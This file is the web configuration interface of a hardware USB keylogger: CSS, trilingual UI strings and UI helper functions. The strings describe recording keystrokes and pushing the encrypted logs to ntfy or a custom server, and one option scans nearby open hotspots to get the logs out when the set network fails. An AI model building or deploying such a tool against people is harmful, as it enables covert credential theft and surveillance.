
document.write(`
<meta charset="utf-8">
<title>USBKeylogger</title>
<link rel="icon" href="/favicon.ico" type="image/png">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
:root {
--bg: #f4f6f8;
--panel: #ffffff;
--text: #18212b;
--muted: #687789;
--line: #d7e0e8;
--accent: #116a63;
--accent-dark: #0c514b;
--home: #4CAF50;
--home-dark: #45a049;
--soft: #eaf4f2;
--danger: #b42318;
--shadow: 0 10px 28px rgba(24, 33, 43, .08);
}
* { box-sizing: border-box; }
body {
margin: 0;
min-height: 100vh;
background: var(--bg);
color: var(--text);
font-family: Arial, Helvetica, sans-serif;
font-size: 15px;
line-height: 1.45;
}
.page {
width: 100%;
max-width: 760px;
margin: 0 auto;
padding: 22px 14px 34px;
}
.topbar {
display: flex;
flex-direction: column;
gap: 12px;
margin-bottom: 16px;
}
.title-line {
display: flex;
align-items: flex-start;
justify-content: space-between;
gap: 12px;
}
.kicker {
margin: 0 0 4px;
color: var(--muted);
font-size: 12px;
font-weight: 700;
letter-spacing: .08em;
}
h1, h2, h3 { margin: 0; line-height: 1.2; }
h1 { font-size: 28px; }
h2 { font-size: 20px; margin-bottom: 14px; }
h3 { font-size: 15px; margin-bottom: 10px; }
.badge {
flex: 0 0 auto;
display: inline-flex;
align-items: center;
min-height: 32px;
padding: 6px 10px;
border-radius: 999px;
background: var(--soft);
color: var(--accent-dark);
font-weight: 700;
}
.panel, .metric {
background: var(--panel);
border: 1px solid var(--line);
border-radius: 8px;
box-shadow: var(--shadow);
}
.panel { padding: 18px; margin: 14px 0; }
.status-grid, .actions, .form-grid, .button-row {
display: grid;
grid-template-columns: 1fr;
gap: 10px;
}
.status-grid { margin-bottom: 14px; }
.actions { margin-top: 4px; }
.metric { padding: 14px; min-width: 0; }
.metric span {
display: block;
color: var(--muted);
font-size: 12px;
font-weight: 700;
text-transform: uppercase;
}
.metric strong {
display: block;
margin-top: 6px;
font-size: 15px;
overflow-wrap: anywhere;
}
.metric-head {
display: flex;
align-items: baseline;
justify-content: space-between;
gap: 10px;
}
.metric-head strong {
margin-top: 0;
text-align: right;
}
.storage-progress {
display: block;
width: 100%;
height: 13px;
margin-top: 12px;
-webkit-appearance: none;
appearance: none;
border: 0;
border-radius: 999px;
overflow: hidden;
background: #e7edf2;
}
.storage-progress::-webkit-progress-bar {
background: #e7edf2;
border-radius: 999px;
}
.storage-progress::-webkit-progress-value {
background: var(--home);
border-radius: 999px;
}
.storage-progress::-moz-progress-bar {
background: var(--home);
border-radius: 999px;
}
.status-list {
display: grid;
gap: 8px;
margin-top: 6px;
}
.status-item {
display: grid;
gap: 3px;
padding-top: 8px;
border-top: 1px solid var(--line);
}
.status-item:first-child { border-top: 0; padding-top: 0; }
.status-label {
color: var(--muted);
font-size: 12px;
font-weight: 700;
text-transform: uppercase;
}
.status-value {
font-weight: 700;
overflow-wrap: anywhere;
}
form { margin: 0; }
.field { min-width: 0; }
label, .label {
display: block;
margin-bottom: 6px;
color: var(--muted);
font-size: 12px;
font-weight: 700;
text-transform: uppercase;
}
.hint {
margin: 6px 0 0;
color: var(--muted);
font-size: 13px;
}
input[type=text], input[type=password], input[type=file], select {
width: 100%;
min-height: 42px;
border: 1px solid var(--line);
border-radius: 6px;
background: #fff;
color: var(--text);
padding: 10px 11px;
font: inherit;
outline: none;
}
input:focus, select:focus {
border-color: var(--accent);
box-shadow: 0 0 0 3px rgba(17, 106, 99, .14);
}
.radio-group {
display: grid;
grid-template-columns: 1fr;
gap: 8px;
}
.radio-pill {
display: flex;
align-items: center;
gap: 8px;
min-height: 40px;
padding: 9px 11px;
border: 1px solid var(--line);
border-radius: 6px;
background: #fff;
color: var(--text);
font-weight: 700;
cursor: pointer;
}
.tab-group {
display: grid;
grid-template-columns: repeat(auto-fit, minmax(60px, 1fr));
gap: 6px;
padding: 4px;
border: 1px solid var(--line);
border-radius: 8px;
background: #eef3f6;
}
.tab-pill {
display: flex;
align-items: center;
justify-content: center;
min-height: 38px;
margin: 0;
border-radius: 6px;
color: var(--muted);
font-weight: 700;
cursor: pointer;
}
.tab-pill input {
position: absolute;
opacity: 0;
pointer-events: none;
}
.tab-pill.active {
background: #fff;
color: var(--accent-dark);
box-shadow: 0 1px 4px rgba(24, 33, 43, .12);
}
#stabs {
display: flex;
gap: 0;
padding: 0;
border: 0;
border-bottom: 2px solid var(--line);
border-radius: 0;
background: transparent;
}
#stabs .tab-pill {
flex: 1;
border-radius: 0;
border-bottom: 3px solid transparent;
margin-bottom: -2px;
background: transparent;
box-shadow: none;
}
#stabs .tab-pill.active {
background: transparent;
color: var(--accent);
border-bottom-color: var(--accent);
box-shadow: none;
}
.divider {
height: 1px;
background: var(--line);
margin: 16px 0;
}
button, .button, input[type=submit] {
display: inline-flex;
align-items: center;
justify-content: center;
width: 100%;
min-height: 44px;
border: 0;
border-radius: 6px;
background: var(--accent);
color: #fff;
padding: 10px 14px;
font: inherit;
font-weight: 700;
text-align: center;
text-decoration: none;
cursor: pointer;
}
button:hover, .button:hover, input[type=submit]:hover { background: var(--accent-dark); }
.home-actions .button {
display: flex;
justify-content: center;
min-height: 46px;
border-radius: 8px;
background: var(--home);
color: #fff;
box-shadow: 0 2px 0 rgba(0, 0, 0, .08);
}
.home-actions .button:hover { background: var(--home-dark); }
.button.secondary, button.secondary {
background: #e7edf2;
color: var(--text);
}
.button.secondary:hover, button.secondary:hover { background: #dbe4eb; }
.button.danger, button.danger {
background: var(--danger);
color: #fff;
}
.button.danger:hover, button.danger:hover { background: #8f1f16; }
[hidden] { display: none !important; }
</style>
`);
var I18N = {
en: {
project: 'ANT Project', console: 'Device Console', settings: 'Settings', language: 'Language',
storage: 'Storage Used', push: 'Push', address: 'Address', network_status: 'Network Status', push_platform: 'Push Platform',
wifi_info: 'Wi-Fi', uptime: 'Uptime',
display_log: 'View Keylog', download_log: 'Download Keylog', delete_log: 'Delete Keylog', reboot: 'Reboot',
firmware: 'Firmware', firmware_file: 'Firmware File', update_firmware: 'Update Firmware', firmware_backup_hint: 'Back up your keylogs before updating. Cross-version updates may erase all data.',
access_point: 'AP Wi-Fi Settings', ssid: 'SSID', password: 'Password', broadcast: 'Broadcast', show_ssid: 'Show SSID', hide_ssid: 'Hide SSID',
station: 'Connect to Wi-Fi Router', sta_ssid: 'STA SSID', sta_password: 'STA Password',
log_push: 'Keylog Push', mode: 'Mode', off: 'Off', ntfy: 'ntfy.sh', custom_http: 'Custom HTTP',
encryption: 'Encryption', aes_key: 'AES Key', aes_hint: 'Used to encrypt uploaded keylog chunks. Keep this key private for local decryption.',
ntfy_server: 'ntfy Server', ntfy_server_hint: 'HTTP endpoint only. Payloads remain AES encrypted; using HTTP removes the ESP8266 TLS overhead.',
ntfy_topic: 'ntfy Topic', ntfy_topic_hint: 'Random topic name used as the upload destination. Longer random values are harder to guess.',
http_url: 'HTTP URL', http_url_hint: 'Custom HTTP endpoint that receives encrypted text/plain payloads.',
bearer_token: 'Bearer Token', bearer_token_hint: 'Optional Authorization bearer token sent to your custom HTTP endpoint.',
push_off_hint: 'Remote keylog push is disabled. Local recording still works.', test_send: 'Test Send', test_send_hint: 'Sends one encrypted test message to the selected push platform.',
timezone: 'Timezone', tz_offset_label: 'UTC Offset (hours)', timezone_hint: 'Timezone offset for log timestamps. Examples: 0 = UTC, 8 = Beijing, 3 = Moscow, -5 = New York.',
factory_reset: 'Factory Reset', factory_reset_hint: 'Erase all settings and keylog files. The device will reboot with a clean state.', factory_reset_confirm: 'Erase ALL settings and keylog files? This cannot be undone. The device will reboot with factory defaults.', factory_reset_done: 'Factory reset complete. Rebooting...',
clear_title: 'Delete Keylog', clear_message: 'It is recommended to download a backup before deleting the keylog.', yes_delete: 'Yes, delete it', no: 'No', cleared_title: 'Keylog Cleared', cleared_message: 'Keylog cleared successfully.',
not_found: 'Not Found', not_found_message: 'Page not found.', back_index: 'Back to Index', cancel: 'Cancel', config_saved: 'Config saved. Rebooting...', rebooting_message: 'Rebooting...',
push_test: 'Push Test', push_test_success: 'Push test success', push_test_failed: 'Push test failed', status: 'Status', reason: 'Reason', http_code: 'HTTP',
general: 'General', save_config: 'Save Config', back: 'Back', english: 'English', chinese: 'Chinese', russian: 'Russian',
web_auth: 'Web Authentication', web_password_label: 'Password (username: admin)', web_password_hint: 'Protect the web interface with a password. Leave empty to disable. Minimum 4 characters.',
on: 'On',
wifi_probe: 'Auto-Scan Open Hotspots for Push',
wifi_probe_hint: 'When push fails via STA, automatically scan nearby open (no password) hotspots and try to push keylogs through the first one that can reach the push server.',
push_success_to: 'Successfully pushed to',
push_via_wifi: 'via Wi-Fi network',
push_config: 'Push Config',
system: 'System',
ntfy_url: 'Subscribe URL',
push_schedule: 'Push Schedule', push_boot: 'Boot Push', push_boot_hint: 'Push ALL accumulated keylogs immediately after boot and Wi-Fi connection. The entire keylog history is sent in one push.',
push_interval_label: 'Interval (minutes)', push_interval_hint: 'Push the full keylog history at this interval. Integer, 10-71580 min. Set 0 to disable.',
system_time: 'System Time', ntp_server_label: 'NTP Server', ntp_server_hint: 'Server for time sync. Common: pool.ntp.org, ntp.aliyun.com, time.cloudflare.com',
sync_time: 'Sync Time', time_settings: 'Time',
ntp_synced: 'Synced', ntp_not_synced: 'Not synced',
probe_scanning: 'Scanning for open hotspots...', probe_connecting: 'Connecting to open hotspot...'
},
zh: {
project: 'ANT Project', console: '设备控制台', settings: '设置', language: '语言',
storage: '已使用的存储空间', push: '推送', address: '地址', network_status: '网络状态', push_platform: '推送平台',
wifi_info: 'Wi-Fi', uptime: '运行时长',
display_log: '查看键盘记录', download_log: '下载键盘记录', delete_log: '删除键盘记录', reboot: '重启',
firmware: '固件管理', firmware_file: '固件文件', update_firmware: '更新固件', firmware_backup_hint: '更新前请备份键盘记录，跨版本更新固件可能丢失数据。',
access_point: '热点 Wi-Fi 配置', ssid: 'SSID', password: '密码', broadcast: '广播 SSID', show_ssid: '显示 SSID', hide_ssid: '隐藏 SSID',
station: '连接到 Wi-Fi 路由器', sta_ssid: 'STA SSID', sta_password: 'STA 密码',
log_push: '键盘记录推送', mode: '模式', off: '关闭', ntfy: 'ntfy.sh', custom_http: '自定义 HTTP',
encryption: '加密', aes_key: 'AES 密钥', aes_hint: '用于加密上传的键盘记录片段，请妥善保管此密钥以备本地解密。',
ntfy_server: 'ntfy 服务器', ntfy_server_hint: '仅支持 HTTP 端点。载荷仍为 AES 加密，使用 HTTP 可避免 ESP8266 的 TLS 开销。',
ntfy_topic: 'ntfy Topic', ntfy_topic_hint: '用于上传的随机主题名称，随机值越长越难猜测。',
http_url: 'HTTP URL', http_url_hint: '自定义 HTTP 端点，接收加密的 text/plain 载荷。',
bearer_token: 'Bearer Token', bearer_token_hint: '发送到自定义 HTTP 端点的可选 Authorization Bearer Token。',
push_off_hint: '远程推送已禁用，本地键盘记录仍正常工作。', test_send: '测试发送', test_send_hint: '向所选推送平台发送一条加密测试消息。',
timezone: '时区', tz_offset_label: 'UTC 偏移（小时）', timezone_hint: '日志时间戳的时区偏移。示例：0 = UTC，8 = 北京，3 = 莫斯科，-5 = 纽约。',
factory_reset: '恢复出厂设置', factory_reset_hint: '清除全部设置和键盘记录，设备将以全新状态重启。', factory_reset_confirm: '确认清除全部设置和键盘记录？此操作不可撤销，设备将恢复出厂默认。', factory_reset_done: '已恢复出厂设置，正在重启...',
clear_title: '删除键盘记录', clear_message: '建议在删除前先下载备份键盘记录。', yes_delete: '确认删除', no: '取消', cleared_title: '键盘记录已清除', cleared_message: '键盘记录已成功清除。',
not_found: '页面未找到', not_found_message: '请求的页面不存在。', back_index: '返回首页', cancel: '取消', config_saved: '配置已保存，正在重启...', rebooting_message: '正在重启...',
push_test: '推送测试', push_test_success: '推送测试成功', push_test_failed: '推送测试失败', status: '状态', reason: '原因', http_code: 'HTTP',
general: '通用', save_config: '保存配置', back: '返回', english: '英文', chinese: '中文', russian: '俄文',
web_auth: 'Web 访问认证', web_password_label: '访问密码（用户名：admin）', web_password_hint: '设置访问 Web 界面所需的密码，留空则不启用认证。最少 4 个字符。',
on: '开启',
wifi_probe: '自动遍历附近开放热点，尝试推送日志',
wifi_probe_hint: '当 STA 无法推送时，自动扫描附近无密码的开放热点，逐一尝试连接并推送完整键盘记录。',
push_success_to: '成功推送到',
push_via_wifi: '通过Wi-Fi网络',
push_config: '推送配置',
system: '系统',
ntfy_url: '订阅链接',
push_schedule: '推送计划', push_boot: '开机推送', push_boot_hint: '启用后，设备启动并连接 Wi-Fi 后立即推送全部累积的键盘记录。',
push_interval_label: '定时推送间隔（分钟）', push_interval_hint: '按此间隔定期推送完整的键盘记录。整数，范围 10-71580 分钟。设置为 0 则禁用定时推送。',
system_time: '系统时间', ntp_server_label: 'NTP 服务器', ntp_server_hint: '时间同步服务器。常用：ntp.aliyun.com、pool.ntp.org、time.cloudflare.com',
sync_time: '同步时间', time_settings: '时间',
ntp_synced: '已同步', ntp_not_synced: '未同步',
probe_scanning: '正在扫描开放热点...', probe_connecting: '正在连接开放热点...'
},
ru: {
project: 'ANT Project', console: 'Консоль устройства', settings: 'Настройки', language: 'Язык',
storage: 'Использовано', push: 'Отправка', address: 'Адрес', network_status: 'Сетевой статус', push_platform: 'Платформа отправки',
wifi_info: 'Wi-Fi', uptime: 'Время работы',
display_log: 'Просмотр записей', download_log: 'Скачать записи', delete_log: 'Удалить записи', reboot: 'Перезагрузка',
firmware: 'Прошивка', firmware_file: 'Файл прошивки', update_firmware: 'Обновить прошивку', firmware_backup_hint: 'Перед обновлением сохраните записи. Обновление между версиями может удалить все данные.',
access_point: 'Настройка точки доступа Wi-Fi', ssid: 'SSID', password: 'Пароль', broadcast: 'Трансляция SSID', show_ssid: 'Показать SSID', hide_ssid: 'Скрыть SSID',
station: 'Подключение к Wi-Fi роутеру', sta_ssid: 'STA SSID', sta_password: 'Пароль STA',
log_push: 'Отправка записей', mode: 'Режим', off: 'Выкл.', ntfy: 'ntfy.sh', custom_http: 'Пользов. HTTP',
encryption: 'Шифрование', aes_key: 'Ключ AES', aes_hint: 'Используется для шифрования фрагментов записей. Храните ключ в тайне для локальной расшифровки.',
ntfy_server: 'Сервер ntfy', ntfy_server_hint: 'Только HTTP endpoint. Payload шифруется AES, HTTP снимает TLS-нагрузку с ESP8266.',
ntfy_topic: 'Тема ntfy', ntfy_topic_hint: 'Случайное имя темы для загрузки. Длинные значения сложнее угадать.',
http_url: 'HTTP URL', http_url_hint: 'Пользовательский HTTP endpoint для зашифрованных text/plain payload.',
bearer_token: 'Bearer Token', bearer_token_hint: 'Необязательный Authorization Bearer Token для пользовательского HTTP endpoint.',
push_off_hint: 'Удалённая отправка записей отключена. Локальная запись продолжается.', test_send: 'Тест отправки', test_send_hint: 'Отправляет одно зашифрованное тестовое сообщение на выбранную платформу.',
timezone: 'Часовой пояс', tz_offset_label: 'Смещение UTC (часы)', timezone_hint: 'Смещение часового пояса для временных меток журнала. Примеры: 0 = UTC, 8 = Пекин, 3 = Москва, -5 = Нью-Йорк.',
factory_reset: 'Сброс настроек', factory_reset_hint: 'Удалить все настройки и записи. Устройство перезагрузится с чистым состоянием.', factory_reset_confirm: 'Удалить ВСЕ настройки и записи? Это действие необратимо. Устройство перезагрузится с заводскими настройками.', factory_reset_done: 'Сброс выполнен. Перезагрузка...',
clear_title: 'Удалить записи', clear_message: 'Перед удалением рекомендуется скачать записи.', yes_delete: 'Да, удалить', no: 'Нет', cleared_title: 'Записи удалены', cleared_message: 'Записи успешно удалены.',
not_found: 'Не найдено', not_found_message: 'Страница не найдена.', back_index: 'На главную', cancel: 'Отмена', config_saved: 'Настройки сохранены. Перезагрузка...', rebooting_message: 'Перезагрузка...',
push_test: 'Тест отправки', push_test_success: 'Тест отправки успешен', push_test_failed: 'Тест отправки не удался', status: 'Статус', reason: 'Причина', http_code: 'HTTP',
general: 'Основные', save_config: 'Сохранить', back: 'Назад', english: 'Английский', chinese: 'Китайский', russian: 'Русский',
web_auth: 'Аутентификация', web_password_label: 'Пароль (логин: admin)', web_password_hint: 'Пароль для доступа к веб-интерфейсу. Оставьте пустым, чтобы отключить. Минимум 4 символа.',
on: 'Вкл.',
wifi_probe: 'Авто-поиск открытых сетей для отправки',
wifi_probe_hint: 'Если STA не может отправить, сканировать открытые (без пароля) точки доступа и попытаться отправить все записи через первую доступную.',
push_success_to: 'Успешно отправлено на',
push_via_wifi: 'через сеть Wi-Fi',
push_config: 'Отправка',
system: 'Система',
ntfy_url: 'URL подписки',
push_schedule: 'Расписание', push_boot: 'При загрузке', push_boot_hint: 'Отправка ВСЕХ накопленных записей сразу после загрузки и подключения к Wi-Fi.',
push_interval_label: 'Интервал (минуты)', push_interval_hint: 'Периодическая отправка полной истории записей с указанным интервалом. Целое число, 10-71580 мин. 0 = отключено.',
system_time: 'Системное время', ntp_server_label: 'Сервер NTP', ntp_server_hint: 'Сервер синхронизации времени. Например: pool.ntp.org, ntp.aliyun.com, time.cloudflare.com',
sync_time: 'Синхронизировать', time_settings: 'Время',
ntp_synced: 'Синхронизировано', ntp_not_synced: 'Не синхронизировано',
probe_scanning: 'Поиск открытых сетей...', probe_connecting: 'Подключение к открытой сети...'
}};
var TZ_DEFAULTS = { en: '0', zh: '8', ru: '3' };
function setLang(lang) {
if (!I18N[lang]) lang = 'en';
localStorage.setItem('uk_lang', lang);
var tzField = document.getElementById('tz_offset');
if (tzField) {
var cur = tzField.value.trim();
if ((cur === '' || cur === '0') && TZ_DEFAULTS[lang] !== undefined) tzField.value = TZ_DEFAULTS[lang];
}
applyLang();
}
function applyLang() {
var lang = localStorage.getItem('uk_lang') || 'en';
var dict = I18N[lang] || I18N.en;
document.documentElement.lang = lang;
document.querySelectorAll('[data-i18n]').forEach(function(el) {
var key = el.getAttribute('data-i18n');
if (dict[key]) el.textContent = dict[key];
});
document.querySelectorAll('[data-i18n-value]').forEach(function(el) {
var key = el.getAttribute('data-i18n-value');
if (dict[key]) el.value = dict[key];
});
var selector = document.getElementById('language_select');
if (selector) selector.value = lang;
}
function updatePushPanels() {
var checked = document.querySelector('input[name="push_mode"]:checked');
var mode = checked ? checked.value : '0';
document.querySelectorAll('[data-push-panel]').forEach(function(panel) {
var target = panel.getAttribute('data-push-panel');
panel.hidden = !((target === mode) || (target === 'common' && mode !== '0'));
});
document.querySelectorAll('.tab-pill').forEach(function(tab) {
var input = tab.querySelector('input[type="radio"]');
tab.classList.toggle('active', !!input && input.checked);
});
}
function updateNtfyUrl() {
var el = document.getElementById('ntfy_link');
if (!el) return;
var sv = (document.getElementById('ntfy_server') || {}).value || '';
var tp = (document.getElementById('ntfy_topic') || {}).value || '';
sv = sv.replace(/\/+$/, '');
if (sv && tp) { var u = sv + '/' + tp; el.href = u; el.textContent = u; el.parentNode.hidden = false; }
else { el.parentNode.hidden = true; }
}
function showSettingsTab(tab) {
document.querySelectorAll('[data-stab]').forEach(function(el) {
el.hidden = (el.getAttribute('data-stab') !== tab);
});
var nav = document.getElementById('stabs');
if (nav) {
var tabs = ['general', 'push', 'system'];
nav.querySelectorAll('.tab-pill').forEach(function(p, i) {
p.classList.toggle('active', tabs[i] === tab);
});
}
localStorage.setItem('uk_stab', tab);
}
document.addEventListener('DOMContentLoaded', function() {
var selector = document.getElementById('language_select');
if (selector) selector.addEventListener('change', function() { setLang(selector.value); });
document.querySelectorAll('.tab-pill input[type="radio"]').forEach(function(radio) {
radio.addEventListener('change', updatePushPanels);
});
applyLang();
updatePushPanels();
var savedTab = localStorage.getItem('uk_stab');
if (savedTab && document.querySelector('[data-stab="' + savedTab + '"]')) {
showSettingsTab(savedTab);
}
var ns = document.getElementById('ntfy_server'), nt = document.getElementById('ntfy_topic');
if (ns) ns.addEventListener('input', updateNtfyUrl);
if (nt) nt.addEventListener('input', updateNtfyUrl);
updateNtfyUrl();
});
